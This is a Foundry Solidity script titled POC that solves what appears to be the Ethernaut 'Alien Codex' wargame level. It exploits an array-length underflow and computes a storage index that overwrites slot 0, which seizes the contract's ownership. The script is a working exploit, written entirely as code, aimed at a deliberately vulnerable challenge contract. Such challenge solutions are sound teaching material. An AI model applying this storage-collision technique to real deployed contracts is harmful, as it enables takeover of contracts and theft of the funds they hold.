// SDPX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/19_Alien_Codex.sol";

contract POC is Script {
    AlienCodex public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = AlienCodex(0x3fD8235db1b3275C44CBB2245f4fcDa4FcC538De);

        uint256 index = (2 ** 256 - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 payload = bytes32(uint256(uint160(vm.envAddress("MY_ADDRESS"))));

        target.makeContact();
        target.retract();

        target.revise(index, payload);
        
        vm.stopBroadcast();
    }
}